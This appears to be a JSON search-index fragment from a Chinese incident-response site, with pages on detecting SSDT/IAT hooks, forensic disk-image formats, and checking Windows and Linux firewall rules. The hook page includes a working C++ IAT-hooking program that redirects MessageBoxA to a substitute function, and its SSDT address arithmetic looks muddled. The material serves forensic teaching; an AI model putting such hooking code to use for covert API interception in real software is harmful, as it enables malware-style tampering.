SSDT Hook属于内核层Hook，也是最底层的Hook。由于用户层的API最后实质也是调用内核API（Kernel32-\u003eNtdll-\u003eNtoskrnl），所以该Hook方法最为强大。\nssdt 内核通过SSDT（System Service Descriptor Table）系统服务描述符表调用各种内核函数，SSDT就是一个函数表，只要得到一个索引值，就能根据这个索引值在该表中得到想要的函数地址。\n下图0x80563520处就是ntoskrnl对应的服务描述符表结构SSDT。那么第一个32位的0x804e58a0则是SSDT Base，即SSDT的首地址。\n通过对这些地址反汇编，就能得到相应的函数，下图中0x80591bfb是SSDT表中的第一个函数NtAcceptConnectPort的地址。\n我们接下来试着寻找NtQuerySystemInformation的地址，首先反汇编ZwQuerySystemInformation，得知它要寻找SSDT中索引号为0xAD的地址。\n从上面我们可以知道，NtQuerySystemInformation的索引号为0xAD，那么我们就可以算出NtQuerySystemInformation的地址： 0x80591bfb + 0xAD = 0x8056ff1\nssdt hook代码实现\n其实内核层Hook并没想象中的那么高大上，Hook的原理相同，只不过Hook的对象不一样罢了。Hook步骤还是那5步：\n1.修改内存属性为RWX。\n2.拼接汇编码jmp [HookFunc]。\n3.保存原代码头5个字节。\n4.将头5个字节替换为2的汇编码。\n5.恢复前5个字节。\n6.恢复内存属性。\n参考：\n豪宝的hook笔记部分\n小宝马的爸爸-进程隐藏与进程保护（SSDT Hook 实现）（一）https://www.cnblogs.com/BoyXiao/archive/2011/09/03/2164574.html\nG4rb3n-Windows Hook原理与实现https://blog.csdn.net/m0_37552052/article/details/81453591\n实现hook 实现IAT Hook IAT（Import Address Table）导入地址表，是执行程序用来查询加载的动态库dll文件、查询函数地址的内存地址表。记录了导入函数的名字和所在动态库的名称.\n参考：\nhttps://baike.baidu.com/item/IAT/20444498?fr=aladdin\n在理参考ired的关于IAThook的教程\n测试流程：\n概述 Windows 可移植可执行文件包含一个名为 Import Address Table (IAT)\nIAT 包含指向可执行文件完成其工作的关键信息的指针：\n提供预期功能所依赖的 DLL 列表\n来自那些 DLL 的函数名称及其地址的列表，这些 DLL 可能在某些时候被二进制文件调用\n可以通过用恶意函数地址覆盖目标函数的地址来挂钩 IAT 中指定的函数指针，并可选择执行最初预期的函数\nHook前 目标程序调用 WinAPI函数MessageBoxA\n程序在 IAT 中查找地址MessageBoxA\n代码执行跳转到第 2 步中解析的 地址，其中显示（绿框）的合法代码所在kernel32!MessageBoxAMessageBoxA\nHook之后 目标程序在钩子之前调用MessageBoxA\n程序在 IAT 中查找地址MessageBoxA\n这次因为IAT被篡改，IAT中的地址指向了一个流氓函数（红框）MessageBoxAhookedMessageBox\n程序跳转到步骤3中检索到的hookedMessageBox\nhookedMessageBox拦截参数并执行一些恶意代码MessageBoxA\nhookedMessageBox调用合法的例程kernel32!MessageBoxA\n二进制文件在内存中的基址位置为0x000007FF6BFD50000\n在IAT操作之前，指向：MessageBoxA地址 0x00007ff6bfd663f2 （IAT地址）\n我们通过查询IAT内存地址即可知道实际MessageBoxA地址0x000007FF6BFD771D8。\n除此之外，我们还可以通过通过CPP查询到的偏移地址也可以推出MessageBoxA的实际地址=基址+偏移地址=0x000007FF6BFD50000+0x000000000000271D8=0x000007FF6BFD771D8\n#include \u003ciostream\u003e #include \u003cWindows.h\u003e #include \u003cwinternl.h\u003e // define MessageBoxA prototype using PrototypeMessageBox = int (WINAPI *)(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType); // remember memory address of the original MessageBoxA routine PrototypeMessageBox originalMsgBox = MessageBoxA; // hooked function with malicious code that eventually calls the original MessageBoxA int hookedMessageBox(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType) { MessageBoxW(NULL, L\"Ola Hooked from a Rogue Senor .o.\", L\"Ola Senor o/\", 0); // execute the original NessageBoxA return originalMsgBox(hWnd, lpText, lpCaption, uType); } int main() { // message box before IAT unhooking MessageBoxA(NULL, \"Hello Before Hooking\", \"Hello Before Hooking\", 0); LPVOID imageBase = GetModuleHandleA(NULL); PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)imageBase; PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + dosHeaders-\u003ee_lfanew); PIMAGE_IMPORT_DESCRIPTOR importDescriptor = NULL; IMAGE_DATA_DIRECTORY importsDirectory = ntHeaders-\u003eOptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]; importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (DWORD_PTR)imageBase); LPCSTR libraryName = NULL; HMODULE library = NULL; PIMAGE_IMPORT_BY_NAME functionName = NULL; while (importDescriptor-\u003eName != NULL) { libraryName = (LPCSTR)importDescriptor-\u003eName + (DWORD_PTR)imageBase; library = LoadLibraryA(libraryName); if (library) { PIMAGE_THUNK_DATA originalFirstThunk = NULL, firstThunk = NULL; originalFirstThunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)imageBase + importDescriptor-\u003eOriginalFirstThunk); firstThunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)imageBase + importDescriptor-\u003eFirstThunk); while (originalFirstThunk-\u003eu1.AddressOfData != NULL) { functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)imageBase + originalFirstThunk-\u003eu1.AddressOfData); // find MessageBoxA address if (std::string(functionName-\u003eName).compare(\"MessageBoxA\") == 0) { SIZE_T bytesWritten = 0; DWORD oldProtect = 0; VirtualProtect((LPVOID)(\u0026firstThunk-\u003eu1.Function), 8, PAGE_READWRITE, \u0026oldProtect); // swap MessageBoxA address with address of hookedMessageBox firstThunk-\u003eu1.Function = (DWORD_PTR)hookedMessageBox; } ++originalFirstThunk; ++firstThunk; } } importDescriptor++; } // message box after IAT hooking MessageBoxA(NULL, \"Hello after Hooking\", \"Hello after Hooking\", 0); return 0; }1.hook执行之前\n此时Trunk指针指向MessageBoxA的实际地址\n2.执行后指针指向hookedMessageBox，这里由于指针在满足hookedMessageBox之后仍然会继续轮询一段IAT，因此会发现程序执行完这个指针最后并不是正好处于HookedMessageBox位置，这里可以参考下图，抓取到的满足逻辑的时刻。\n3.之后执行hookedMessageBox。\n4.最后hook结束\n参考：\nhttps://www.ired.team/offensive-security/code-injection-process-injection/import-adress-table-iat-hooking\nhttps://tech-zealots.com/malware-analysis/journey-towards-import-address-table-of-an-executable-file/\n实现inline hook 实现hotfix hook 实现ssdt hook 检测hook IAThook检测 通过查看详情，可以看到钩子源MessageBoxA，目标已经挂在了HookedMessageBox上。\n找到程序内存IAT双击进入程序内存位置。\n通过反汇编分析hook程序功能。\n这里因为无法直接复制汇编，手工反汇编，因此需要借助dbg进行进一步分析，这里测试环境下我们选择重新VS运行不调试执行Ctrl+F5，然后附加dbg中，目标地址这次有所变化。\n通过定位到内存中目标地址的内存情况。\nmov qword ptr ss:[rsp+8],rbx mov qword ptr ss:[rsp+10],rbp mov qword ptr ss:[rsp+18],rsi push rdi sub rsp,20 mov ebx,r9d mov rdi,r8 mov rsi,rdx lea r8,qword ptr ds:[7FF6A3DF3328] mov rbp,rcx lea rdx,qword ptr ds:[7FF6A3DF3350] xor r9d,r9d xor ecx,ecx call qword ptr ds:[\u003c\u0026MessageBoxW\u003e] mov r9d,ebx mov r8,rdi mov rdx,rsi mov rcx,rbp mov rbx,qword ptr ss:[rsp+30] mov rbp,qword ptr ss:[rsp+38] mov rsi,qword ptr ss:[rsp+40] add rsp,20 pop rdi jmp qword ptr ds:[\u003cint (__cdecl* __ptr64 originalMsgBox)(struct HWND__ * __ptr64,char const * __ptr64,char const * __ptr64,unsigned int)\u003e] mov qword ptr ss:[rsp+8],rbx mov qword ptr ss:[rsp+10],rbp mov qword ptr ss:[rsp+18],rsi push rdi push r12 push r13 push r14 push r15 sub rsp,50这里另外一种方式通过，火绒剑的dump功能将钩子程序dump专项分析。\nlinux下应用层和内核钩子检查 ",
    "description": "",
    "tags": null,
    "title": "钩子检查",
    "uri": "/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/%E9%92%A9%E5%AD%90%E6%A3%80%E6%9F%A5/index.html"
  },
  {
    "content": "镜像格式 镜像各格式的区别 **DD镜像：**也称成原始格式(RAW Image)。DD镜像 的优点是兼容性强，目前所有磁盘镜像和分析工具都支持DD格式。此外，由于没有压缩，镜像速度较快。DD镜像最主要的问题就是非压缩格式，镜像文件与原始证据磁盘容量完全一致。即便原始证据磁盘仅有很少的数据，也一样需要同样的磁盘容量。DD镜像是对嫌疑硬盘进行位对位的复制方法，因此生成的镜像文件中没有保存额外信息的空间。因此，例如硬盘序列号、调查员姓名、镜像地点等信息必须保存在镜像文件之外的单独文件.TXT文件中。由于这些信息没有被保存在镜像文件内部，就有可能出现丢失或与其他硬盘信息混淆的情况。也就是说DD 镜像文件不包 含文件头和校验值。相关数据信息可以配合以txt文本形式文件进行描述。”的文档。 **E01镜像：**传统的EnCase证据文件（.E01）是法证分析工具EnCase的一个证据文件格式，较好的解决了DD镜像的一些不足。EnCase以一系列特有的压缩片段格式保存证据文件。每个片段都可以在需要时被单独地调用并解压缩，因此可以实现随机地访问镜像中的数据。Encase证据文件中包含有三个组成部分：文件头、校验值和数据块。这三部分组成了对于一个原始证据的描述，并可用于将证据文件重新恢复至硬盘。E01格式最大的问题就是兼容性问题。EnCase格式是非公开的、具有知识产权的商业软件镜像格式。 **Ex01镜像：**EnCase V7引进的新格式，EnCase证据文件（.Ex01）是E01的数据加密格式，设置密码后，若忘记密码则无法读取其中数据。 **L01镜像：**传统的EnCase逻辑证据文件（L01）L01是仅仅对元数据中的一部分文件制作镜像的一种格式。E01及L01文件虽然也支持添加密码，但是密码仅用来限制镜像文件的打开，数据部分并未真正加密，很多取证工具可以直接忽略E01及L01文件的密码。如果需要处理的对象是整个存储设备或整个分区，应该保存成E01或Ex01格式；如果仅仅对源数据中的部分文件制作镜像，应该选择L01或Lx01格式。 **Lx01镜像：**EnCase V7引进的新格式，现行的EnCase逻辑证据文件（.Lx01）Lx01是L01的数据加密格式，设置密码后，若忘记密码则无法读取其中数据。如果工作中要使用其他取证工具进行分析，为了保证兼容性，建议选择E01及L01格式，否则可以使用Ex01及Lx01格式。 **AFF镜像：**针对E01和DD镜像文件的不足，AFFLIB公司于2006年推出了开源的证据文件格式AFF格式（Advanced Forensics Format）。这种格式是公开且可扩展的。和EnCase证据文件格式相似，AFF也以压缩片段的方式保存磁盘镜像，镜像文件经过压缩容量明显减小。和EnCase不同的是，AFF既可以将元数据保存在镜像文件内部，也可以同时允许元数据被单独保存在一个文件夹中。一旦发生磁盘镜像文件破损的情况，AFF的内部连续性算法也能够保证尽可能多的将破损的镜像恢复修复。AFF分段镜像可以被开源工具zlib进行压缩，也可以保持未压缩状态。对AFF压缩格式可以节省空间，但是创建时间较长，而且分析处理的速度较慢。具体采用压缩还是不采用压缩，可以根据实际情况来决定。但是未压缩的AFF文件可以很容易地再次压缩。 **img镜像：**img格式是图像文件的一种格式，它具有很高的压缩效率，IMG格式支持任意大小的图像。img 图像文件格式，图像的数据是以类似二维数组格式存放的。在其第一行的头两个位置存放的是图像的宽度，其后面的两位是存放着图像的高度，接着的一个位置里存放着图像的灰度级，而其剩下的所有位置存放的都是图像的灰度。IMG格式常用于Digital Research 应用程序中。img格式属于镜像的一种，可以通过制作数据光盘或者使用虚拟光驱(如 WinMount)安装IMG数据文件。 由于.ISO只能压缩使用ISO9660和UDF这两种文件系统的存储媒介，意即.ISO只能拿来压缩CD或DVD，因此才发展出了.IMG，它是以.ISO格式为基础另外新增可压缩使用其它文件系统的存储媒介的能力，.IMG可向后兼容于.ISO，如果是拿来压缩CD或DVD，则使用.IMG和.ISO这两种格式所压缩出来的内容是一样的。img格式的打开方式可以是光盘刻录，也可以用软件解压。IMG可以做为以下用途：数字存储、传输、以及整片软盘内容的复制，可挂载到虚拟软盘上。 ** **\n各产品特性对比表： 产品名 支持的系统 支持数据类型 支持镜像的格式 EnCase Forensic Imager win 镜像文件（包括E01、L01、Ex01、Lx01、dd、vmdk、vhd等格式）本地连接的各种磁盘、存储卡内存数据远程数据（需要配合LinEn使用） Ex01/Lx01/E01/L01 dd/dc3dd linux 磁盘文件数据 RAW Getdata forensic imager win 获取物理，逻辑，文件夹和文件。 E01/L01 Clonezilla win/linux 磁盘文件数据 RAW 安恒windows应急取证精灵 win 支持在线或离线方式镜像可选择镜像的格式、分卷大小、储存位置、是否压缩、哈希计算方式 dd/E01/AFF Datanumen disk image win 支持各种磁盘和驱动器 img Guymager linux 支持各种磁盘和驱动器 dd/E01/AFF 各产品特性详情： EnCase Forensic Imager(win) 特性 允许获取本地驱动器 可以免费下载和使用吗 不需要安装 一个独立的产品不需要装箱取证许可证吗 允许浏览和查看潜在的证据文件，包括文件夹结构和文件元数据 使用强AES 256位加密保护Lx01和Ex01文件 可以通过USB部署，并用于执行获取一个实时设备 EnCase Imager支持处理常见的各种数据类型：\n镜像文件（包括E01、L01、Ex01、Lx01、dd、vmdk、vhd等格式） 本地连接的各种磁盘、存储卡 内存数据 远程数据（需要配合LinEn使用） 其中支持镜像文件，主要用来转换格式，以减小原镜像体积，以及添加证据编号、备注信息等各种元数据。\n镜像格式 EnCase Imager可以生成四种格式的镜像\nEx01/Lx01/E01/L01 dd/dc3dd(linux) 特性: linux自带免安装 压缩格式： RAW Image 可加gzip命令压缩 Getdata forensic imager (win) 特点 获取物理，逻辑，文件夹和文件。 重新获取现有的取证图像文件。 支持使用GetData Forensics Servlet从远程设备进行获取。 使用MD5，SHA1或SHA256采集哈希值获取.E01或DD格式。 使用完整的MD5，SHA1或SHA256文件哈希获取L01格式的文件夹和文件。 创建后自动验证采集哈希。 对整个设备成像或设置开始和结束扇区位置。 将图像文件分割成没有段大小限制的自定义段。 设置设备扇区大小以获取512、2048或4096扇区大小的选项。 强制将Windows兼容文件名与Magnet Forensics产品一起使用的选项。 镜像格式 E01/L01 支持E01和L01格式的EnCase None，Fast，Good，Best压缩设置。包括E01和L01格式写入采集信息。\nClonezilla (win\\linux) 特性 支持GNU/Linux下的LVM2 (LVM版本1不支持)。 可以重新安装引导加载程序，包括grub(版本1和版本2)和syslinux。 支持MBR和GPT分区格式的硬盘驱动器。Clonezilla live也可以在BIOS或uEFI机器上启动。 支持无人值守模式。几乎所有的步骤都可以通过命令和选项来完成。您还可以使用许多引导参数来定制您自己的映像和克隆。 支持一个映像恢复到多个本地设备。 镜像可以被加密。这是通过ecryptfs完成的，这是一种符合posix的企业加密堆叠文件系统。 Clonezilla SE支持多播，适合大规模克隆。如果您的客户端支持PXE和局域网唤醒，您也可以远程使用它来保存或恢复一堆计算机。 Clonezilla lite服务器支持BT (Bittorrent)，适合大规模部署。BT模式的工作由Ezio完成。 映像文件可以在本地磁盘、ssh服务器、samba服务器、NFS服务器或WebDAV服务器上。 AES-256加密可用于保护数据的访问、存储和传输。 基于Partclone(默认)、Partimage(可选)、ntfsclone(可选)、dd对分区进行镜像或克隆。然而，包含其他一些程序的Clonezilla不仅可以保存和恢复分区，还可以保存和恢复整个磁盘。 通过使用我们自己开发的另一款免费软件drbl-winroll，可以自动更改克隆的MS windows机器的主机名、组名和SID。 支持许多文件系统:\n(1)ext2、ext3, ext4, reiserfs, reiser4, xfs、jfs, btrfs, f2fs nilfs2 GNU / Linux, (2) FAT12, FAT16, FAT32, NTFS Windows, (3)HFS + Mac OS, (4) UFS FreeBSD, NetBSD, OpenBSD, (5) minix minix, (6) VMFS3 VMFS5 VMWare ESX。 因此，无论32位(x86)操作系统还是64位(x86-64)操作系统，都可以克隆GNU/Linux、MS windows、intel Mac OS、FreeBSD、NetBSD、OpenBSD、Minix、VMWare ESX、Chrome OS/Chromium操作系统。对于这些文件系统，Partclone只保存和恢复分区中使用过的块。对于不支持的文件系统，在Clonezilla中，扇区到扇区的复制是由dd完成的。\n镜像格式 dd（RAW） ** **\n安恒windows应急取证精灵 (win) 特性 支持在线或离线方式镜像 可选择镜像的格式、分卷大小、储存位置、是否压缩、哈希计算方式 镜像格式 dd/E01/AFF 支持MD5/sha1校验 Datanumen disk image (win) 特性 支持各种磁盘和驱动器。\n支持Windows 95/98/ME/NT/2000/XP/Visa/7/8/8.1/10和Windows Server 2003/2008/2012/2016/2019。\n支持恢复图像数据回驱动器。\n支持从损坏的媒体克隆数据。\n支持用指定的数据替换损坏的扇区。\n支持批量克隆多个磁盘和驱动器。\n理想用作计算机取证工具和电子发现(或e-discovery, eDiscovery)工具。\n镜像格式 img Guymager (linux) 特性： Guymager[ˈgɪmɪdʒər]是一款免费的媒体采集取证成像仪。它的主要特点是:\n•简单的用户界面在不同的语言\n•在Linux下运行\n•非常快，由于多线程，流水线设计和多线程数据压缩\n•充分利用多处理器机器\n•生成平面(dd)， EWF (E01)和AFF映像，支持磁盘克隆\n•免费，完全开源\n最新版本是0.8.12。\n镜像格式： dd/EWF (E01)/AFF\n",
    "description": "",
    "tags": null,
    "title": "镜像类型及各产品特性对比",
    "uri": "/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/1%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F/%E9%95%9C%E5%83%8F%E7%B1%BB%E5%9E%8B%E5%8F%8A%E5%90%84%E4%BA%A7%E5%93%81%E7%89%B9%E6%80%A7%E5%AF%B9%E6%AF%94/index.html"
  },
  {
    "content": "windows下防火墙规则检查 查询防火墙规则可以通过运行WF.msc，也可以通过netsh advfirewall 命令查询。\nnetsh advfirewall C:\\Users\\xt\u003enetsh advfirewall ? 下列指令有效: 此上下文中的命令: ? - 显示命令列表。 consec - 更改到 `netsh advfirewall consec' 上下文。查询连接规则。 dump - 显示一个配置脚本。 export - 将当前策略导出到文件。 firewall - 更改到 `netsh advfirewall firewall' 上下文。查询出入站规则。 help - 显示命令列表。 import - 将策略文件导入当前策略存储。 mainmode - 更改到 `netsh advfirewall mainmode' 上下文。查询主模式规则。 monitor - 更改到 `netsh advfirewall monitor' 上下文。查询防火墙状态信息。 reset - 将策略重置为默认全新策略。 set - 设置每个配置文件或全局设置。 show - 显示配置文件或全局属性。 下列的子上下文可用: consec firewall mainmode monitor 若需要命令的更多帮助信息，请键入命令，接着是空格， 后面跟 ?。 show 此上下文中的命令: show allprofiles - 显示所有配置文件的属性。 show currentprofile - 显示活动配置文件的属性。 show domainprofile - 显示域配置文件的属性。 show global - 显示全局属性。 show privateprofile - 显示专用配置文件的属性。 show publicprofile - 显示公用配置文件的属性。 show store - 显示当前交互式会话的策略存储。 C:\\Users\\xt\u003enetsh advfirewall consec show rule 提供的许多参数无效。请查看帮助获取正确语法。 用法: show rule name=\u003cstring\u003e [profile=public|private|domain|any[,...]] [type=dynamic|static (default=static)] [verbose] 注释: - 显示按名称识别的所有规则实例， 也可按配置文件和类型识别。 示例: 显示所有规则: netsh advfirewall consec show rule name=all 显示所有动态规则: netsh advfirewall consec show rule name=all type=dynamic C:\\Users\\xt\u003enetsh advfirewall firewall /? 下列指令有效: 此上下文中的命令: ? - 显示命令列表。 add - 添加新入站或出站防火墙规则。 delete - 删除所有匹配的防火墙规则。 dump - 显示一个配置脚本。 help - 显示命令列表。 set - 为现有规则的属性设置新值。 show - 显示指定的防火墙规则。 C:\\Users\\xt\u003enetsh advfirewall mainmode /? 下列指令有效: 此上下文中的命令: ? - 显示命令列表。 add - 添加新的主模式规则。 delete - 删除所有匹配的主模式规则。 dump - 显示一个配置脚本。 help - 显示命令列表。 set - 为现有规则的属性设置新值。 show - 显示指定的主模式规则。 C:\\Users\\xt\u003enetsh advfirewall monitor show ? 下列指令有效: 此上下文中的命令: show consec - 显示当前 consec 状态信息。 show currentprofile - 显示当前活动的配置文件。 show firewall - 显示当前防火墙状态信息。 show mainmode - 显示当前主模式状态信息。 show mmsa - 显示主模式 SA show qmsa - 显示快速模式 SA。查询所有防火墙配置 netsh advfirewall show allprofiles # 查询所有防火墙配置 查询所有连接安全规则 # 管理员权限netsh netsh\u003e advfirewall consec show rule name=all以创建的出入站请求身份验证连接安全规则为例，规则名称为test。\nconsec规则访问需要管理员权限，这里进入管理员cmd然后执行netsh\u003e advfirewall consec show rule name=all进行查询。\n查询所有出入站规则 netsh advfirewall firewall show rule name=all # 查询所有出入站规则举例这里创建一个名为9999portaccess规则的入站规则\n这里通过过滤和筛选定位入站规则\nlinux下防火墙规则检查 iptables iptables是内核空间安全框架的命令行工具。iptables根据规则定义在PREROUTING、INPUT、FORWARD、OUTPUT、POSTROUTING链路上起到相应的作用。5个链路及其对应的表的对应关系如下图所示，这里引用朱双印的这个图形象的表示对应关系：\n由于不同的链的规则有的存在重复，通过表的引用可以对相同功能的规则合集。根据功能大致可以分为四种表：\nfilter表：负责过滤功能，防火墙；内核模块：iptables_filter\nnat表：network address translation，网络地址转换功能；内核模块：iptable_nat\nmangle表：拆解报文，做出修改，并重新封装 的功能；iptable_mangle\nraw表：关闭nat表上启用的连接追踪机制；iptable_raw\n四种表的涉及的链的对应关系如下表，也同样参考朱双印总结的表格做理解：\n查询表中的规则 iptables -t raw -L # 列出所有raw表中的所有规则 iptables -t mangle -L # 列出mangle表中所有规则 iptables -t nat -L # 列出nat表中所有规则 iptables -t filter -L # 列出filter表中所有规则查看不同的链中的规则 iptables -L INPUT # 只看filter表中（默认-t 是filter表）input链的规则 iptables -vL INPUT # 只看filter表中（默认-t 是filter表）input链的规则详情 iptables -nvL INPUT # 只看filter表中（默认-t 是filter表）input链的规则详情，同时不对IP地址进行名称反解析，直接显示IP iptables --line-number -nvL INPUT # 只看filter表中（默认-t 是filter表）input链的规则详情，同时不对IP地址进行名称反解析，直接显示IP，每行加行标IPTABLES规则中常见的动作有：ACCEPT（接受）、DROP（丢弃）、REJECT（拒绝）。\n增删改举例不展开，详细参考可以看IPTABLES规则管理增删改：\niptables -t filter -I INPUT -s 192.168.188.188 -j DROP # 丢弃所有来自192.168.188.188的入站报文 可以看到规则已经匹配到并拦截。\niptables -t filter -D INPUT 1 # 删除入站规则中重复的一条 iptables -t filter -R INPUT 1 -d 192.168.188.188 -j REJECT # 修改入站规则 参考：\nIPTABLES基础 https://www.zsythink.net/archives/1199\nIPTABLES规则管理增删改 https://www.zsythink.net/archives/1517\nnftables nftables官方网站，从linux内核\u003e=3.13开始，iptables将改为nftables，但仍然存在兼容iptables。参考what is nftables。\n相对于iptables的优点 在 iptables 中添加一条规则，会随着规则数量增多而变得非常慢。这种状况对 nftables 而言就不存在了，因为 nftables 使用原子的快速操作来更新规则集合。 使用 iptables 时，每一个匹配或投递都需要内核模块的支持。因此，如果你忘记一些东西或者要添加新的功能时都需要重新编译内核。而在 nftables 中就不存在这种情况了， 因为在 nftables 中，大部分工作是在用户态完成的，内核只知道一些基本指令（过滤是用伪状态机实现的）。例如，icmpv6 支持是通过 nft 工具的一个简单的补丁实现的，而在 iptables 中这种类型的更改需要内核和 iptables 都升级才可以。 查看nftables的规则汇总 nft list tables [\u003cfamily\u003e] nft list table [\u003cfamily\u003e] \u003cname\u003e [-n] [-a] nft list tables # 列出所有表 nft list table family table # 列出指定表中的所有链和规则 nft list table inet filter # 要列出inet簇中f nft list chain family table chain # 列出一个链中的所有规则 nft list chain inet filter output # 要列出inet中filter表的output链中的所有规则nftables的表管理 与 iptables 中的表不同，nftables 中没有内置表。表的数量和名称由用户决定。每个表只有一个地址簇，并且只适用于该簇的数据包。nftables 表可以指定为以下五个簇中的一个：\nnftables 簇 对应 iptables 的命令行工具 ip iptables ip6 ip6tables inet iptables 和 ip6tables arp arptables bridge ebtables ip（即 IPv4）是默认簇，如果未指定簇，则使用该簇。如果要创建同时适用于 IPv4 和 IPv6 的规则，请使用 inet 簇 。inet 允许统一 ip 和 ip6 簇，以便更容易地定义规则。\n注意: inet 不能用于 nat 类型的链，只能用于 filter 类型的链。\n下面我们来看看 nftables 是如何进行表管理操作的，以下为 nftables 创建表的基本命令语法。\nnft list tables [\u003cfamily\u003e] nft list table [\u003cfamily\u003e] \u003cname\u003e [-n] [-a] nft (add | delete | flush) table [\u003cfamily\u003e] \u003cname\u003enft表管理 nft add table family table # 创建一个新的表 nft list tables # 列出所有表 nft list table family table # 列出指定表中的所有链和规则 nft list table inet filter # 要列出inet簇中filter表中的所有规则 nft delete table family table # 删除一个表 nft flush table family table # 要清空一个表中的所有规则 nftables的链管理 nft链管理 nft add chain family table chain # 将名为chain的常规链添加到名为table的表中 nft add chain inet filter tcpchain #例如，将名为tcpchain的常规链添加到inet簇中名为filter的表中 nft add chain family table chain { type type hook hook priority priority \\; } # 添加基本链，需要指定钩子和优先级值 nft list chain family table chain # 列出一个链中的所有规则 nft list chain inet filter output # 要列出inet中filter表的output链中的所有规则 nft chain family table chain { [ type type hook hook device device priority priority \\; policy \u003cpolicy\u003e \\; ] } # 要编辑一个链，只需按名称调用并定义要更改的规则 nft chain inet filter input { policy drop \\; } # 将默认表中的input链策略从accept更改为drop nft delete chain family table chain # 删除一个链,要删除的链不能包含任何规则或者跳转目标。 nft flush chain family table chain # 清空一个链的规则*type*可以是filter、route或者nat。\nIPv4/IPv6/Inet地址簇中，*hook*可以是prerouting、input、forward、output或者postrouting。其他地址簇中的钩子列表请参见nft(8)。\n*priority*采用整数值。数字较小的链优先处理，并且可以是负数。[3]\n例如，添加筛选输入数据包的基本链：\n# nft add chain inet filter input { type filter hook input priority 0; }\n将上面命令中的add替换为create则可以添加一个新的链，但如果链已经存在，则返回错误。\nnftables规则管理 添加规则 nft add rule family table chain handle handle statement # 将一条规则添加到链中 nft insert rule family table chain handle handle statement # 将规则插入到指定位置,如果未指定handle，则规则插入到链的开头。表达式 通常情况下，*statement*包含一些要匹配的表达式，然后是判断语句。结论语句包括accept、drop、queue、continue、return、jump *chain*和goto *chain*。也可能是其他陈述。有关信息信息，请参阅nft(8)。\nnftables中有多种可用的表达式，并且在大多数情况下，与iptables的对应项一致。最明显的区别是没有一般或隐式匹配。一般匹配是始终可用的匹配，如--protocol或--source。隐式匹配是用于特定协议的匹配，如TCP数据包的--sport。\n以下是可用匹配的部分列表：\nmeta （元属性，如接口）\nicmp （ICMP协议）\nicmpv6 （ICMPv6协议）\nip （IP协议）\nip6 （IPv6协议）\ntcp （TCP协议）\nudp （UDP协议）\nsctp （SCTP协议）\nct （链接跟踪）\n完整列表请参见nft(8)\n删除规则 # 下面命令确定一个规则的句柄，然后删除。--number参数用于查看数字输出，如未解析的IP地址。 # nft --handle --numeric list chain inet filter input table ip fltrTable { chain input { type filter hook input priority 0; ip saddr 127.0.0.1 accept # handle 10 } } nft delete rule inet fltrTable input handle 10 # 可以用nft flush table命令清空表中的所有的链。可以用nft flush chain或者nft delete rule命令清空单个链。 # 第一个命令清空foo表中的所有链。第二个命令清空ip foo表中的bar链。第三个命令删除ip6 foo表bar两种的所有规则。 nft flush table foo nft flush chain foo bar nft delete rule ip6 foo bar自动重载 清空当前规则集： # echo \"flush ruleset\" \u003e /tmp/nftables 导出当前规则集： # nft list ruleset \u003e\u003e /tmp/nftables 可以直接修改/tmp/nftables文件，使更改生效则运行： # nft -f /tmp/nftables参考：\nhttps://www.hi-linux.com/posts/29206.html\n",
    "description": "",
    "tags": null,
    "title": "防火墙规则检查",
    "uri": "/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/%E9%98%B2%E7%81%AB%E5%A2%99%E8%A7%84%E5%88%99%E6%A3%80%E6%9F%A5/index.html"
  }
]
